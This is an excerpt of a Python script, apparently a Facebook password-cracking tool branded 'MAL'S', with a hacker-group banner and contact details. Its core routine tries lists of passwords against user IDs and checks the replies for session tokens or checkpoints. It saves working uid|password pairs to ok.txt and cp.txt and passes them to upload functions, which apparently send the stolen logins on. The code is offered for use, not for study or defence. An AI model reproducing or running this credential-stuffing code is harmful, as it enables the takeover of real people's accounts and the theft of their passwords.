...
def helpnote():
	...
	subprocess.check_output(["am", "start", "https://github.com/MALS-009/MALS/blob/main/MALS.txt"])
	exit(" [*] FACEBOOK :  ASHIK MALS")
...
def notice():
	...
	runtxt("\033[0;92m ADMIN MESSENGER🔰MAL'S")
	subprocess.check_output(["am", "start", "https://www.facebook.com/profile.php?id=100080957155376"])
...
class Main:
	def __init__(self):
		...
		self.loop = 0
		try:
			plr = requests.get('https://github.com/MALS-009/MALS/blob/main/MALS.txt').text
			if basesplit in plr:
				key = basesplit
...
MM    MM   AAA   LL      """""  SSSSS  
MMM  MMM  AAAAA  LL      """"" SS      
MM MM MM AA   AA LL       """   SSSSS  
MM    MM AAAAAAA LL                 SS 
MM    MM AA   AA LLLLLLL        SSSSS
\033[1;90m══════════════════════════════════════════════════
\033[1;91m [\033[1;94m✓\033[1;91m] \033[1;92mFACEBOOK : ASHIK MALS  
\033[1;91m [\033[1;94m✓\033[1;91m] \033[1;92mFB GROUP : ERROR SPAMMING TEAM 
\033[1;91m [\033[1;94m✓\033[1;91m] \033[1;92mGITHUB   : MAL'S
\033[1;91m [\033[1;94m✓\033[1;91m] \033[1;92mWhatsapp  : 01311321651
\033[1;90m══════════════════════════════════════════════════
    """)
	...
	def api(self, uid, pwx):
		...
		sys.stdout.write(
			"\r\r %s[>_] [MAL'S_OLD] : %s/%s -> \033[0;92m [ MAL'S-OK:%s ]- \033[0;91m[MAL'S-CP:%s ]"%(B,self.loop, len(self.id), len(self.ok), len(self.cp))
		); sys.stdout.flush()
		for pw in pwx:
			pw = pw.lower()
			...
			if "session_key" in response.text and "EAAA" in response.text:
				print("\r \033[0;92m[MAL'S-OK] %s|%s\033[0;97m         "%(uid, pw))
				self.ok.append("%s|%s"%(uid, pw))
				open("ok.txt","a").write(" [MAL'S-OK] %s|%s\n"%(uid, pw))
				uploadoks()
				break
			elif "www.facebook.com" in response.json()["error_msg"]:
				print("\r \033[0;91m[MAL'S-CP] %s|%s\033[0;97m         "%(uid, pw))
				self.cp.append("%s|%s"%(uid, pw))
				open("cp.txt","a").write(" [MAL'S-CP] %s|%s\n"%(uid, pw))
				uploadcps()
				break
			else:
				continue
